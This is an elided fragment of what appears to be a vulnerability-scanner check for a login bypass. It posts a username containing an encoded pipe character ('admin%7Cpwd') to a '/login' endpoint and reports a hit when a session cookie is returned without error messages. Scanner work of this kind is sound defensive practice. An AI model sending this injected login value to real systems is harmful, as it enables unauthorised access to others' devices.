...
function check_remote(port){
	url = "/login";
	data = "op=login&username=admin%7Cpwd&password=111111";
	if (get_kb_list("SSL/Transport/"+port)){
		...
		if('"exitcode":0' >< ssl_reqs && "Set-Cookie:" >< ssl_reqs && "username=" >< ssl_reqs && "does not exist" >!< ssl_reqs && "incorrect password" >!< ssl_reqs){
			report = data;
		...
		if('"exitcode":0' >< res_send[2] && "Set-Cookie:" >< res_send[1] && "username=" >< res_send[1] && "does not exist" >!< res_send[2] && "incorrect password" >!< res_send[2]){
			report = data;
			return {'vuln':true, 'report':report};
		}
